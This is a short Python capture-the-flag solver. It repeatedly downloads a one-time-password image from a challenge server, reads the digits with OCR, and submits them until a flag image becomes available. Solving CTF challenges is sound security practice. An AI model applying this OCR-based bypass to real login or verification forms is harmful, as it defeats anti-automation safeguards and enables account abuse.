import requests
from PIL import Image
import shutil
from bs4 import BeautifulSoup
import PIL.ImageOps    
import tesserocr
import sys

url = 'http://challenge.ctf.games:30137/'

s = requests.Session()

def get_otp():
    global s
    r = s.get(url + 'static/otp.png', stream=True)
    with open('otp.png', 'wb') as fp:
        shutil.copyfileobj(r.raw, fp)
    img = Image.open('otp.png').crop((8, 13, 139, 39))
    img = PIL.ImageOps.invert(img)
    otp = tesserocr.image_to_text(img).strip()
    otp = ''.join([ch for ch in otp if ch in '0123456789'])
    return otp


def try_flag():
    global s
    r = s.get(url + 'static/flag.png', stream=True)
    if r.status_code != 404:
        print('Found Flag')
        with open('flag.png', 'wb') as fp:
            shutil.copyfileobj(r.raw, fp)
        print('Flag saved')
        sys.exit(0)


while True:
    otp = get_otp()
    r = s.post(url, data={'otp_entry': otp})
    soup = BeautifulSoup(r.text, 'html.parser')
    lvl = soup.find('p').getText()
    print(f'Level: {lvl: <5}      OTP: {otp}')
    try_flag()

